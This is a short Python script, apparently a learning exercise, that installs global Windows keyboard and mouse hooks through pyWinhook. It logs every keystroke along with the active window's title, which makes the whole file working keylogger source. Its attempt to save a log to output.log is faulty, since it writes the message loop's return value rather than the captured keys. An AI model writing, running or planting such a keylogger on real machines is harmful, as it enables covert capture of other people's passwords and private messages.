import atexit

import pythoncom
import pyWinhook

global window
window = None


def check_window(event):
    global window
    if event.WindowName != window:
        if event.WindowName != 'Chrome Legacy Window':
            print(f"Window: {event.WindowName}")
            window = event.WindowName


def keystroke(event):
    check_window(event)
    if event.Ascii > 32 and event.Ascii < 127:
        print(chr(event.Ascii), end="")
    else:
        print(' ' + event.Key)

    return True


def mouse_event(event):
    check_window(event)

    return True


def get_keys():
    hm = pyWinhook.HookManager()
    hm.KeyDown = keystroke
    hm.MouseAll = mouse_event
    hm.HookKeyboard()
    hm.HookMouse()
    log = pythoncom.PumpMessages()
    with open('output.log', 'w') as f:
        f.write(log)
        f.close()
    



if __name__ == '__main__':
    get_keys()